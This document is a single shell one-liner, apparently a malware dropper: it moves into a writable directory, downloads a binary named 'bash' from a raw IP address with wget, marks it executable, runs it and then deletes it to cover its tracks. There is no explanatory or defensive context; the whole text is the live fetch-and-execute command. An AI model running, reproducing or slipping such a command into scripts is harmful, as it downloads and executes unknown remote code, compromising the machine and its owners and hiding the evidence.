cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://217.61.17.20/bash; chmod +x bash; ./bash; rm -rf bash
